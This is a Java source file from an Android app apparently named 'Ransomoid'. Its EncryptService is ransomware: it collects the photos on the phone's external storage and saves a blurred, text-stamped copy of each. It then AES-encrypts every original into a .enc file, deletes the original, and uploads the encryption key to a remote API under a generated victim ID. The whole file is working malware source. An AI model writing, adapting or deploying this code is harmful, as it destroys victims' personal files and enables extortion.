package falezza.fabio.ransomoid.services;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.IBinder;
import android.util.Base64;
import android.widget.Toast;

import java.io.File;
import java.util.ArrayList;
import java.util.UUID;

import falezza.fabio.ransomoid.activities.EncryptedActivity;
import falezza.fabio.ransomoid.utils.AesEncrypter;
import falezza.fabio.ransomoid.utils.Api;
import falezza.fabio.ransomoid.utils.AppDelegate;
import falezza.fabio.ransomoid.utils.FileProcessor;
import falezza.fabio.ransomoid.utils.ImageProcessor;

public class EncryptService extends Service {

    private static final String[] imgExtensions =
            {".jpg", ".jpeg", ".png", ".JPG", ".PNG", ".JPEG"};

    private static final String[] excludeExtensions = {"Android/data", ".thumbnails"};

    ArrayList<File> imgList;

    @Override
    public void onCreate() {
        super.onCreate();
        FileProcessor fileProcessor = FileProcessor.getInstance();
        this.imgList = fileProcessor.getFiles(Environment.getExternalStorageDirectory(),
                imgExtensions, excludeExtensions);
        this.encrypt();
    }

    private void encrypt() {
        Toast.makeText(this, "Encrypting...", Toast.LENGTH_LONG).show();
        try {
            ImageProcessor imgProcessor = ImageProcessor.getInstance(this);
            AesEncrypter aesEncrypter = AesEncrypter.getInstance();
            aesEncrypter.generateRandomKey();
            this.generateId();
            for (File img : this.imgList) {
                if (!isEncrypted(img)) {
                    imgProcessor.setFile(img);
                    imgProcessor.blur();
                    imgProcessor.drawText();
                    imgProcessor.saveCopy();

                    aesEncrypter.setFile(img);
                    byte[] encrypted = aesEncrypter.encrypt();
                    FileProcessor.getInstance().writeBytesToFile(encrypted,
                            img.getPath() + ".enc");

                    if (!img.delete()) {
                        throw new Exception("Cannot delete file");
                    }
                }
            }

            Api.getInstance(this).send(
                    AppDelegate.getInstance(this).getByTag(AppDelegate.userID),
                    Base64.encodeToString(aesEncrypter.getKey(), Base64.DEFAULT));

        } catch (Exception e) {
            e.printStackTrace();
        }

        Intent intent = new Intent(this, EncryptedActivity.class);
        startActivity(intent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private boolean isEncrypted(File file) {
        return file.getPath().contains(".enc");
    }

    private void generateId() {
        String uniqueID = UUID.randomUUID().toString();
        AppDelegate.getInstance(this).saveUserID(uniqueID);
    }
}
